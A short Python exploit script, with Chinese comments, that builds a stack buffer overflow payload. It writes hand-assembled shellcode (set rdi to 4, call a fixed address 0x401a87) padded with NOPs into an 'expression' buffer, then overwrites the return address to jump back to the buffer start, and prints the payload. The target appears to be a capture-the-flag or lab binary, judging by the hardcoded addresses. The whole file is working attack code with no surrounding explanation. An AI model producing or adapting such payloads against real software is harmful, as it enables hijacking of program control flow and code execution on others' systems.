#!/usr/bin/env python3
# 把 shellcode 写进 expression，返回地址指回缓冲区开头
import sys
import struct

# push 4 / pop rdi / movabs rax,0x401a87 / call rax
sc = b"\x6a\x04" + b"\x5f" + b"\x48\xb8" + struct.pack("<Q", 0x401a87) + b"\xff\xd0"
sc = sc.ljust(16, b"\x90")

payload = sc
payload += struct.pack("<Q", 0x721000800ff0)
payload += struct.pack("<Q", 0x721000800fd0)    # 返回地址 = shellcode 开头
payload += b"\n"

sys.stdout.buffer.write(payload)
